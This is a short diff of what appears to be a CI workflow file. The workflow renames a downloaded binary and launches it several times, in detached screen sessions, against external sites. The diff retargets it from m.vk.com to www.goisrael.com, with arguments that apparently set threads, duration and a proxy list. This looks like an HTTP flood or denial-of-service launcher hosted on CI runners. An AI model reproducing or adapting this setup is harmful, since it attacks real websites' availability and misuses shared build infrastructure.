@@ -36,10 +36,10 @@ jobs:
           chmod +x *
           mv tol o          
           
-          screen -dms ve ./o https://m.vk.com/? 200 1 1 90,txt 
-          screen -dms ve ./o https://m.vk.com/? 200 1 1 90,txt 
+          screen -dms ve ./o https://www.goisrael.com? 200 1 1 90,txt 
+          screen -dms ve ./o https://www.goisrael.com? 200 1 1 90,txt 
           
-          ./o https://m.vk.com/ 200 1 1  90.txt
+          ./o https://www.goisrael.com 200 1 1  90.txt
 
           
 
